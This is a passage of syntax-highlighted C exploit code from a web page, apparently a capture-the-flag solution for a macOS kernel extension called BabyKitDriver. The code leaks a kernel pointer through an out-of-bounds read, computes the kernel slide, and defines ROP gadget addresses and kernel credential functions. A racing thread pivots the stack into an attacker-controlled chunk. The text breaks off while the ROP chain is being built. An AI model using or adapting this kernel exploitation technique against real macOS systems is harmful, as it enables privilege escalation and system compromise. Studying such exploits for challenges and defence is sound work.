</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;IOKit/IOKitLib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;CoreFoundation/CoreFoundation.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;mach/mach.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kBabyRead 	    0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kLeaveMessage 	1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kIOKitClassName &#34;BabyKitDriver&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KERNEL_BASE_NO_SLID 0xFFFFFF8000100000ULL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kbase</span><span class="p">,</span> <span class="n">slide</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">io_connect_t</span> <span class="n">connection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">ropChain</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">loop_end</span> <span class="o">=</span> <span class="mi">100000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Gadgets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define push_rcx_jmp_qword_ptr_rsi_plus_0x66 slide+0xffffff8000a984e1 </span><span class="c1">// push rcx ; out dx, eax ; jmp qword ptr [rsi + 0x66]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pop_rcx slide+0xffffff800034fb88
</span></span></span><span class="line"><span class="cl"><span class="cp">#define mov_rdi_rax_pop_rbp_jmp_rcx slide+0xffffff8000364001
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ret slide+0xffffff8000335311
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_r14_r15 slide+0xffffff8000352176
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_rsp_r13_r14_r15 slide+0xffffff8000352173
</span></span></span><span class="line"><span class="cl"><span class="cp">#define mov_qword_rcx_rax_pop_rbp slide+0xffffff800037a86e </span><span class="c1">// mov qword ptr [rcx], rax ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define mov_rsi_rax_spoil_rax_pop_rbp_ret 0xffffff8000536392+slide  </span><span class="c1">// mov rsi, rax ; sub rax, rsi ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pop_rdi 0xFFFFFF8000334E74+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_rdx 0xFFFFFF80006FF654+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_r8_eax_spoil 0xffffff80004db621+slide  </span><span class="c1">// pop r8 ; add eax, 0x5d000000 ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define add_rsi_rcx_mov_rax_rsi_pop_rbp 0xffffff80009ce25d+slide </span><span class="c1">// 0xffffff80009ce25d : add rsi, rcx ; mov rax, rsi ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define mov_dword_ptr_rsi_r8d_pop_rbp 0xffffff8000474e08+slide</span><span class="c1">// 0xffffff8000474e08 : mov dword ptr [rsi], r8d ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Existing kernel functions
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define current_thread slide+0xFFFFFF80004D1ED0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define current_proc slide+0xFFFFFF8000989860
</span></span></span><span class="line"><span class="cl"><span class="cp">#define proc_ucred slide+0xFFFFFF80008556B0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pmap_ro_zone_atomic_op slide+0xFFFFFF80004B0410
</span></span></span><span class="line"><span class="cl"><span class="cp">#define thread_exception_return slide+0xFFFFFF8000334DCA
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Debugging purposes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define debug_gadget 0xffffff800033620a+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define addr_save_loc 0xFFFFFF8000C18000+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define eb_fe 0xFFFFFF800037E726+slide
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Helper method during debugging
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">print_data</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;-----&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">fmt_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34;0x%04x: 0x%016lx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34; 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;-----&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">GetKextAddr</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">fp</span> <span class="o">=</span> <span class="nf">popen</span><span class="p">(</span><span class="s">&#34;kextstat 2&gt;/dev/null | grep BabyKitDriver | awk &#39;{print $3}&#39;&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get KEXT address!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="nf">strtoul</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">baby_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOConnectCallScalarMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span><span class="n">kBabyRead</span><span class="p">,(</span><span class="k">const</span> <span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leave_message</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">msg_type</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">args</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">msg_type</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOConnectCallScalarMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span><span class="n">kLeaveMessage</span><span class="p">,(</span><span class="k">const</span> <span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">babyKitConnect</span><span class="p">(</span><span class="kt">io_connect_t</span> <span class="o">*</span><span class="n">connection</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">kern_return_t</span>   <span class="n">kr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">io_service_t</span>    <span class="n">serviceObject</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">io_iterator_t</span>   <span class="n">iterator</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">CFDictionaryRef</span> <span class="n">classToMatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">classToMatch</span> <span class="o">=</span> <span class="nf">IOServiceMatching</span><span class="p">(</span><span class="n">kIOKitClassName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">classToMatch</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceMatching returned a NULL dictionary</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">serviceObject</span> <span class="o">=</span> <span class="nf">IOServiceGetMatchingService</span><span class="p">(</span><span class="n">kIOMainPortDefault</span><span class="p">,</span> <span class="n">classToMatch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">MACH_PORT_VALID</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceGetMatchingService failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">kr</span> <span class="o">=</span> <span class="nf">IOServiceOpen</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">,</span> <span class="nf">mach_task_self</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">connection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">IOObjectRelease</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceOpen returned %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">race</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loop_end</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ropChain</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Setup connection
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="nf">babyKitConnect</span><span class="p">(</span><span class="o">&amp;</span><span class="n">connection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Get leak with the first bug (setting size to 0 will trigger OOB read)
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">baby_read</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">leaked</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mh">0x318</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">kext_base</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="mh">0x1808</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">slide</span> <span class="o">=</span> <span class="n">kext_base</span> <span class="o">-</span> <span class="nf">GetKextAddr</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0xdc000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">kbase</span> <span class="o">=</span> <span class="n">KERNEL_BASE_NO_SLID</span> <span class="o">+</span> <span class="n">slide</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kext Base       : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kext_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Text Base: 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Slide    : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slide</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// getchar();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Build our ROP Chain
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">chain</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Start at chunk+0x8 in driver. When the race is triggered,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// chunk+0x8 will be called, which will pivot the stack to this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// chunk and do ROP Chain.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">push_rcx_jmp_qword_ptr_rsi_plus_0x66</span><span class="p">;</span> <span class="c1">// rsi+0x66 will contains gadget to pivot stack to this heap chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// chunk+0x10 won&#39;t be used
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Our ROP will start here after stack pivot with pop rsp; pop r13; pop r14; pop r15;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// , where popped rsp value will be chunk+0x0, so the ROP chain will start at chunk+0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// We will try to perform
